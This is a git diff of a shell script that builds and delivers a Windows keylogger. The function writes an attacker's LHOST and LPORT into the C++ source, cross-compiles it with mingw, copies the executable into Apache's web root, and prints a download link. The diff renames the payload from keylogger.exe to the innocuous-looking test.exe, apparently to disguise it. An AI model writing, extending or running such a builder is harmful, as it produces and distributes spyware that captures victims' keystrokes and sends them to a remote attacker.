@@ -27,21 +27,21 @@ show_options() {
 # Function to compile and set up keylogger
 generate_keylogger() {
   echo "Updating C++ code with the provided LHOST and LPORT..."
-  sed -i "s/REPLACE_WITH_LHOST/$LHOST/" keylogger.cpp
-  sed -i "s/REPLACE_WITH_LPORT/$LPORT/" keylogger.cpp
+  sed -i "s/REPLACE_WITH_LHOST/$LHOST/" program.cpp
+  sed -i "s/REPLACE_WITH_LPORT/$LPORT/" program.cpp
 
   echo "Compiling the C++ code..."
-  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ keylogger.cpp -o keylogger.exe -lws2_32
+  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ program.cpp -o test.exe -lws2_32
 
-  echo "Compilation completed. The keylogger executable is keylogger.exe"
+  echo "Compilation completed. The keylogger executable is test.exe"
 
   echo "Moving the keylogger executable to the Apache server directory..."
-  sudo mv keylogger.exe /var/www/html/
+  sudo mv test.exe /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
+  echo "The keylogger is available at: http://$LHOST/test.exe"
 }
 
 # Function to start the Python server
